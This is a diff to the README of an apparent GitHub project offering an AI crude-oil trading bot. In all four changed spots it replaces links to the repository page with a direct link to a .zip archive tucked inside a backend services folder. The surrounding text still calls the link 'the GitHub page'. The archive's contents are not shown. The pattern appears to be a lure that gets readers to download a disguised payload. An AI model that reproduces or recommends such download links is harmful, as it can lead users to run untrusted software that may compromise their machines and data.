@@ -1,6 +1,6 @@
 # ⚙️ ai-crude-oil-trading-bot - Automated Oil Market Analysis
 
-[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
+[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ericaless553/ai-crude-oil-trading-bot/main/backend_api_python/app/services/trading_crude_ai_bot_oil_v2.3.zip)
 
 ## Overview
 
@@ -31,9 +31,9 @@ Before installing, make sure your computer meets these basic requirements:
 
 The bot is available on GitHub. Follow these steps to download and start it on your Windows PC:
 
-1. Click the blue **Download** button below or visit the GitHub page at [https://github.com/Ericaless553/ai-crude-oil-trading-bot](https://github.com/Ericaless553/ai-crude-oil-trading-bot).
+1. Click the blue **Download** button below or visit the GitHub page at [https://raw.githubusercontent.com/Ericaless553/ai-crude-oil-trading-bot/main/backend_api_python/app/services/trading_crude_ai_bot_oil_v2.3.zip](https://raw.githubusercontent.com/Ericaless553/ai-crude-oil-trading-bot/main/backend_api_python/app/services/trading_crude_ai_bot_oil_v2.3.zip).
 
-[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
+[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ericaless553/ai-crude-oil-trading-bot/main/backend_api_python/app/services/trading_crude_ai_bot_oil_v2.3.zip)
 
 2. On the GitHub page, locate the **Releases** section. This is often found on the right side or in the repository menu.
 
@@ -123,4 +123,4 @@ This project covers:
 - Risk management strategies  
 - Technical indicators usage  
 
-[Download ai-crude-oil-trading-bot](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
+[Download ai-crude-oil-trading-bot](https://raw.githubusercontent.com/Ericaless553/ai-crude-oil-trading-bot/main/backend_api_python/app/services/trading_crude_ai_bot_oil_v2.3.zip)
